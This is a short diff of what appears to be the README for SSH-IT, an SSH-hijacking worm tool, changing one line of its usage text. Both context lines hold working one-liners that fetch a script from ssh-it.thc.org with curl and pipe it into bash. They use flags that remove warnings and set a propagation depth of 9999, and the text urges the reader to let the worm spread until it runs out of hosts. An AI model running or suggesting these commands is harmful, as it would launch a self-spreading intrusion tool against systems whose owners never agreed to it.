@@ -46,7 +46,7 @@ Take off all safety and run SSH-IT in release mode (*with no warnings*):
 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
-Or go bonkers and let the worm run until the Internet runs out of hosts:
+Or go bonkers and let the worm run until the Internet runs out of hosts to own:
 ```shell
 THC_DEPTH=9999 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
